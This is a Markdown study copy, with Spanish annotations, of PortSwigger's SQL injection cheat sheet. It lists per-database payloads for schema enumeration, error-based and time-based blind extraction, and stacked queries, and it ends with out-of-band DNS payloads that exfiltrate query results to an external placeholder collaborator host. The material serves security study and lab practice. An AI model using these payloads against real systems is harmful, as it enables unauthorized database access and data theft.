# SQL Injection — Cheat Sheet

> Copia fiel de la cheat sheet oficial de PortSwigger para estudio offline.
> Fuente: <https://portswigger.net/web-security/sql-injection/cheat-sheet>
> Volver al punto de entrada: [README.md](README.md) · Labs: [labs/README.md](labs/README.md)

> [!note] 🟡 Cómo leer el resaltado
> Lo que está <mark>resaltado</mark> es lo que **reemplazás vos**: tu consulta (`YOUR-QUERY-HERE`), tu condición (`YOUR-CONDITION-HERE`), el nombre de tabla (`TABLE-NAME-HERE`) o tu subdominio de Burp Collaborator (`BURP-COLLABORATOR-SUBDOMAIN`).

This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

## String concatenation

You can concatenate together multiple strings to make a single string.

<table>
<tr><th>Motor</th><th>Sintaxis</th></tr>
<tr><td>Oracle</td><td><code>'foo'||'bar'</code></td></tr>
<tr><td>Microsoft</td><td><code>'foo'+'bar'</code></td></tr>
<tr><td>PostgreSQL</td><td><code>'foo'||'bar'</code></td></tr>
<tr><td>MySQL</td><td><code>'foo' 'bar'</code> (nota el espacio entre las dos cadenas)<br><code>CONCAT('foo','bar')</code></td></tr>
</table>

## Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

<table>
<tr><th>Motor</th><th>Sintaxis</th></tr>
<tr><td>Oracle</td><td><code>SUBSTR('foobar', 4, 2)</code></td></tr>
<tr><td>Microsoft</td><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr>
<tr><td>PostgreSQL</td><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr>
<tr><td>MySQL</td><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr>
</table>

## Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input.

<table>
<tr><th>Motor</th><th>Sintaxis</th></tr>
<tr><td>Oracle</td><td><code>--comment</code></td></tr>
<tr><td>Microsoft</td><td><code>--comment</code><br><code>/*comment*/</code></td></tr>
<tr><td>PostgreSQL</td><td><code>--comment</code><br><code>/*comment*/</code></td></tr>
<tr><td>MySQL</td><td><code>#comment</code><br><code>-- comment</code> (nota el espacio tras el doble guion)<br><code>/*comment*/</code></td></tr>
</table>

## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

<table>
<tr><th>Motor</th><th>Sintaxis</th></tr>
<tr><td>Oracle</td><td><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code></td></tr>
<tr><td>Microsoft</td><td><code>SELECT @@version</code></td></tr>
<tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr>
<tr><td>MySQL</td><td><code>SELECT @@version</code></td></tr>
</table>

## Database contents

You can list the tables that exist in the database, and the columns that those tables contain.

<table>
<tr><th>Motor</th><th>Sintaxis</th></tr>
<tr><td>Oracle</td><td><code>SELECT * FROM all_tables</code><br><code>SELECT * FROM all_tab_columns WHERE table_name = '<mark>TABLE-NAME-HERE</mark>'</code></td></tr>
<tr><td>Microsoft</td><td><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = '<mark>TABLE-NAME-HERE</mark>'</code></td></tr>
<tr><td>PostgreSQL</td><td><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = '<mark>TABLE-NAME-HERE</mark>'</code></td></tr>
<tr><td>MySQL</td><td><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = '<mark>TABLE-NAME-HERE</mark>'</code></td></tr>
</table>

## Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true.

<table>
<tr><th>Motor</th><th>Sintaxis</th></tr>
<tr><td>Oracle</td><td><code>SELECT CASE WHEN (<mark>YOUR-CONDITION-HERE</mark>) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></td></tr>
<tr><td>Microsoft</td><td><code>SELECT CASE WHEN (<mark>YOUR-CONDITION-HERE</mark>) THEN 1/0 ELSE NULL END</code></td></tr>
<tr><td>PostgreSQL</td><td><code>1 = (SELECT CASE WHEN (<mark>YOUR-CONDITION-HERE</mark>) THEN 1/(SELECT 0) ELSE NULL END)</code></td></tr>
<tr><td>MySQL</td><td><code>SELECT IF(<mark>YOUR-CONDITION-HERE</mark>,(SELECT table_name FROM information_schema.tables),'a')</code></td></tr>
</table>

## Extracting data via visible error messages

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

<table>
<tr><th>Motor</th><th>Sintaxis</th></tr>
<tr><td>Microsoft</td><td><code>SELECT 'foo' WHERE 1 = (SELECT 'secret')</code><br>↳ <code>Conversion failed when converting the varchar value 'secret' to data type int.</code></td></tr>
<tr><td>PostgreSQL</td><td><code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)</code><br>↳ <code>invalid input syntax for integer: "secret"</code></td></tr>
<tr><td>MySQL</td><td><code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))</code><br>↳ <code>XPATH syntax error: '\secret'</code></td></tr>
</table>

## Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

<table>
<tr><th>Motor</th><th>Sintaxis</th></tr>
<tr><td>Oracle</td><td>Does not support batched queries.</td></tr>
<tr><td>Microsoft</td><td><code><mark>QUERY-1-HERE</mark>; <mark>QUERY-2-HERE</mark></code><br><code><mark>QUERY-1-HERE</mark> <mark>QUERY-2-HERE</mark></code></td></tr>
<tr><td>PostgreSQL</td><td><code><mark>QUERY-1-HERE</mark>; <mark>QUERY-2-HERE</mark></code></td></tr>
<tr><td>MySQL</td><td><code><mark>QUERY-1-HERE</mark>; <mark>QUERY-2-HERE</mark></code></td></tr>
</table>

## Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

<table>
<tr><th>Motor</th><th>Sintaxis</th></tr>
<tr><td>Oracle</td><td><code>dbms_pipe.receive_message(('a'),10)</code></td></tr>
<tr><td>Microsoft</td><td><code>WAITFOR DELAY '0:0:10'</code></td></tr>
<tr><td>PostgreSQL</td><td><code>SELECT pg_sleep(10)</code></td></tr>
<tr><td>MySQL</td><td><code>SELECT SLEEP(10)</code></td></tr>
</table>

## Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.

<table>
<tr><th>Motor</th><th>Sintaxis</th></tr>
<tr><td>Oracle</td><td><code>SELECT CASE WHEN (<mark>YOUR-CONDITION-HERE</mark>) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</code></td></tr>
<tr><td>Microsoft</td><td><code>IF (<mark>YOUR-CONDITION-HERE</mark>) WAITFOR DELAY '0:0:10'</code></td></tr>
<tr><td>PostgreSQL</td><td><code>SELECT CASE WHEN (<mark>YOUR-CONDITION-HERE</mark>) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td></tr>
<tr><td>MySQL</td><td><code>SELECT IF(<mark>YOUR-CONDITION-HERE</mark>,SLEEP(10),'a')</code></td></tr>
</table>

## DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

**Oracle** — The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:

<pre><code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>/"&gt; %remote;]&gt;'),'/l') FROM dual</code></pre>

The following technique works on fully patched Oracle installations, but requires elevated privileges:

<pre><code>SELECT UTL_INADDR.get_host_address('<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>')</code></pre>

**Microsoft**

<pre><code>exec master..xp_dirtree '//<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>/a'</code></pre>

**PostgreSQL**

<pre><code>copy (SELECT '') to program 'nslookup <mark>BURP-COLLABORATOR-SUBDOMAIN</mark>'</code></pre>

**MySQL** — The following techniques work on Windows only:

<pre><code>LOAD_FILE('\\\\<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>\\a')
SELECT ... INTO OUTFILE '\\\\<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>\a'</code></pre>

## DNS lookup with data exfiltration

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

**Oracle**

<pre><code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT <mark>YOUR-QUERY-HERE</mark>)||'.<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>/"&gt; %remote;]&gt;'),'/l') FROM dual</code></pre>

**Microsoft**

<pre><code>declare @p varchar(1024);set @p=(SELECT <mark>YOUR-QUERY-HERE</mark>);exec('master..xp_dirtree "//'+@p+'.<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>/a"')</code></pre>

**PostgreSQL**

<pre><code>create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT <mark>YOUR-QUERY-HERE</mark>);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();</code></pre>

**MySQL** — The following technique works on Windows only:

<pre><code>SELECT <mark>YOUR-QUERY-HERE</mark> INTO OUTFILE '\\\\<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>\a'</code></pre>
